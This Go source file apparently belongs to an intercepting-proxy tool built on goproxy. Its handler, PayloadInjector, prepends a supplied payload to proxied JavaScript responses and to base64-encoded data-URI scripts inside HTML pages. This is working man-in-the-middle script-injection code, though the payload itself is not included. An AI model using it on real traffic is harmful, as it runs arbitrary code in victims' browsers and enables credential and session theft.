package api

import (
	"io"
	"net/http"
	"regexp"
	"strings"

	"github.com/cristalhq/base64"

	"github.com/elazarl/goproxy"
)

func PayloadInjector(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
	if resp == nil || resp.Body == nil {
		return resp
	}

	// Retrieve the payload code from the request's context
	payload, ok := ctx.Req.Context().Value(payloadKey).(string)
	if !ok {
		ctx.Warnf("Error was returned. Skipping payload injection...")
		return resp
	}
	if payload == "" {
		ctx.Logf("No payload was passed")
		return resp
	}

	contentType := resp.Header.Get("Content-Type")
	ctx.Logf("Content-Type: %s", contentType)

	if strings.HasPrefix(contentType, "text/html") {
		// Inject into base64 encoded parts
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			ctx.Warnf("Failed to read response body: %v", err)
			return resp
		}
		resp.Body.Close()

		html := string(body)
		html = injectPayloadIntoHTML(html, payload, ctx)

		resp.Body = io.NopCloser(strings.NewReader(html))
	} else if strings.HasPrefix(contentType, "application/javascript") || strings.HasPrefix(contentType, "text/javascript") {
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			ctx.Warnf("Failed to read response body: %v", err)
			return resp
		}
		resp.Body.Close()

		script := payload + string(body)
		resp.Body = io.NopCloser(strings.NewReader(script))
	}

	return resp
}

func injectPayloadIntoHTML(html string, payload string, ctx *goproxy.ProxyCtx) string {
	// Inject the payload code into embedded base64 scripts within the page
	pattern := regexp.MustCompile(`data:(?:application|text)/javascript;base64,([\w+/=]+)`)
	ctx.Logf("Scanning for embedded scripts")
	return pattern.ReplaceAllStringFunc(html, func(match string) string {
		ctx.Logf("Match found!")
		prefix := match[:strings.Index(match, "base64,")+len("base64,")]
		encodedScript := match[len(prefix):] // Extract the base64 encoded script
		decodedScript, err := base64.StdEncoding.DecodeString(encodedScript)
		if err != nil {
			ctx.Warnf("Failed to decode base64 script: %v", err)
			return match // Return the original match if there's an error in decoding
		}
		// Prepend the payload code to the decoded script
		decodedScript = []byte(payload + string(decodedScript))
		// Re-encode the modified script to base64
		encodedScript = base64.StdEncoding.EncodeToString(decodedScript)
		// Return the modified script
		return prefix + encodedScript
	})
}
